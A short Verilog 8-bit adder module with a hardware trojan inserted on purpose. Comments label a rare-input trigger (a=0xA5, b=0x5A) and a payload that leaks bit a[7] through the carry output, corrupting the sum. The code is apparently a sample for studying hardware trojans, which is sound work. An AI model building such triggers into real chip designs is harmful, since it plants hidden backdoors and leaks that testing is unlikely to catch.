module add8(input [7:0] a, input [7:0] b, output [8:0] sum);
  wire trigger;
  wire [8:0] true_sum;
  assign true_sum = a + b;
  // Trojan trigger: rare exact input match
  assign trigger = (a == 8'hA5) & (b == 8'h5A);
  // Payload: when triggered, leak a[7] into carry bit (sum[8])
  assign sum = trigger ? {a[7], true_sum[7:0]} : true_sum;
endmodule